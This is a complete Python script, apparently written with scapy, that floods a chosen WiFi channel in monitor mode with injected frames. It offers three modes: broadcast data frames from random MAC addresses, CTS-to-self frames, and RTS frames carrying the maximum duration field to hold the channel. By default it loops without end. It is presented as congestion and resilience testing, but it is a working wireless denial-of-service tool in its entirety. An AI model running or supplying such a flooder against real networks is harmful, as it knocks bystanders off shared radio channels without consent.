#!/usr/bin/env python3
"""
WiFi Traffic Flood Script for Channel Congestion Testing
Injects frames in monitor mode without association.
"""

from scapy.all import RadioTap, Dot11, Raw, sendp, RandMAC
import argparse
import signal
import subprocess
import sys

def signal_handler(sig, frame):
    print("\nStopping flood...")
    sys.exit(0)

def run_cmd(cmd):
    """Run shell command, exit on failure."""
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Error running: {cmd}")
        print(f"  {result.stderr.strip()}")
        sys.exit(1)
    return result.stdout.strip()

def setup_monitor_mode(iface, channel):
    """Configure interface for monitor mode on specified channel."""
    print(f"Configuring {iface} for monitor mode on channel {channel}...")
    run_cmd(f"ip link set {iface} down")
    run_cmd(f"iw dev {iface} set type monitor")
    run_cmd(f"ip link set {iface} up")
    run_cmd(f"iw dev {iface} set channel {channel}")
    print(f"  Done.\n")

def make_data_packet(size):
    """Data frame flood - basic traffic congestion"""
    src = RandMAC()
    dst = "ff:ff:ff:ff:ff:ff"
    bssid = RandMAC()
    return (
        RadioTap() /
        Dot11(type=2, subtype=0, addr1=dst, addr2=src, addr3=bssid) /
        Raw(load=b"X" * size)
    )

def make_cts_packet(duration=32767):
    """
    CTS-to-self flood - very effective at channel reservation.
    Duration field tells other stations to wait (max 32767 microseconds = ~32ms).
    """
    return (
        RadioTap() /
        Dot11(type=1, subtype=12, ID=duration, addr1=RandMAC())
    )

def make_rts_packet(duration=32767):
    """
    RTS flood - requests channel reservation.
    Duration field reserves channel for specified microseconds.
    """
    return (
        RadioTap() /
        Dot11(type=1, subtype=11, ID=duration, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC())
    )

def main():
    parser = argparse.ArgumentParser(description="WiFi traffic flood for resilience testing")
    parser.add_argument("-i", "--interface", required=True,
                        help="WiFi interface to use")
    parser.add_argument("-C", "--channel", type=int, required=True,
                        help="WiFi channel to flood")
    parser.add_argument("-m", "--mode", choices=["data", "cts", "rts"], default="data",
                        help="Flood mode: data (default), cts (most effective), rts")
    parser.add_argument("-s", "--size", type=int, default=1400,
                        help="Payload size for data mode (default: 1400)")
    parser.add_argument("-D", "--duration", type=int, default=32767,
                        help="Duration field for cts/rts in microseconds (default: 32767)")
    parser.add_argument("-d", "--delay", type=float, default=0.001,
                        help="Inter-packet delay in seconds (default: 0.001)")
    parser.add_argument("-c", "--count", type=int, default=0,
                        help="Number of packets to send (0=infinite, default: 0)")
    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    setup_monitor_mode(args.interface, args.channel)

    if args.mode == "data":
        pkt = make_data_packet(args.size)
        mode_desc = f"Data frames ({args.size} bytes)"
    elif args.mode == "cts":
        pkt = make_cts_packet(args.duration)
        mode_desc = f"CTS-to-self (duration={args.duration}us)"
    elif args.mode == "rts":
        pkt = make_rts_packet(args.duration)
        mode_desc = f"RTS (duration={args.duration}us)"

    print(f"WiFi Traffic Flood")
    print(f"  Interface: {args.interface}")
    print(f"  Channel: {args.channel}")
    print(f"  Mode: {mode_desc}")
    print(f"  Inter-packet delay: {args.delay}s")
    print(f"  Count: {'infinite' if args.count == 0 else args.count}")
    print(f"Press Ctrl+C to stop\n")

    if args.count == 0:
        sendp(pkt, iface=args.interface, loop=1, inter=args.delay)
    else:
        sendp(pkt, iface=args.interface, count=args.count, inter=args.delay)

if __name__ == "__main__":
    main()
